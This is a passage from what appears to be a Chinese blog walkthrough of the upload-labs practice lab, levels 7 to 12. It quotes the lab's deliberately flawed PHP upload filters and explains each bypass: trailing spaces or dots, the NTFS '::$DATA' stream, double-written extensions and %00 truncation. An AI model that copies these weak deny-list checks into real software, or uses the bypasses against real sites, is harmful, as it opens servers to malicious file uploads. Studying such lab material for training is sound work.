class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pass–07"><a href="#pass–07" class="headerlink" title="pass–07"></a>pass–07</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以拿下题代码跟上题代码进行比较看缺了什么 就对什么进行突破,很明显首尾去空被弄掉了，那就是这题的突破口</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307092114255.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307092115300.png"></p><h2 id="pass–08"><a href="#pass–08" class="headerlink" title="pass–08"></a>pass–08</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码没有首先去掉末尾的点，而先取的最后一个点后面的内容，如我们上传一个1.php. 他就会取点后面的内容在进行小写转换，绕过了黑名单检测</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307092133207.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307092134972.png"></p><h2 id="pass–09"><a href="#pass–09" class="headerlink" title="pass–09"></a>pass–09</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">观察源代码发现, 删除了 $data ，根据这个我们可以利用。</span><br><span class="line">问了下chatgpt，这个是根据windowsNTFS文件流的特点进行绕过黑名单检测。这个文件流有默认数据和备用数据.</span><br><span class="line">使用::$data  第一个冒号表示使用默认数据流，第二个冒号就是使用数据流的名称。默认情况下，文件中的数据存储在默认数据流中，而不使用冒号指定的具体数据流名称。因此，如果你只使用一个冒号，文件上传将使用默认数据流。</span><br><span class="line">说简单点就是你上传了一个1.php::$data,winsows还是把他看成了1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307171525088.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再去访问php不要::$data</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307171526203.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们可以去根目录查看这个文件发现他默认就是1.php</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307171527322.png"></p><h2 id="pass–10"><a href="#pass–10" class="headerlink" title="pass–10"></a>pass–10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还是使用. .进行绕过</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pass–11"><a href="#pass–11" class="headerlink" title="pass–11"></a>pass–11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个代码str_ireplace函数我们可以利用双写去绕过</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307171549590.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307171550624.png"></p><h2 id="pass–12"><a href="#pass–12" class="headerlink" title="pass–12"></a>pass–12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第12关和之前的关不同是白名单的上传机制，只允许上传的他指定的文件。但12用到的技巧就是00截断。这个只适用于PHP5.3.4之前的版本.且</span><br><span class="line">要关闭php  magic_quotes_gpc（魔术引号开关）函数 他会对用户传递的 get post cookie 进行转义，所以做12关时将他关闭。</span><br><span class="line">在一些编程语言和操作系统中，空字节被用作字符串的终止符。这意味着在空字节之后的所有内容都会被忽略，导致截断字符串的效果。</span><br><span class="line">查看源码可以看到，他用了一个get参数传参这个是可以控制的，我们假设上传一个1.php%00那么他后面的数据就会被忽略掉。</span><br><span class="line">为什么是%00因为get请求用的是url编码，直接00无法解析的。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span 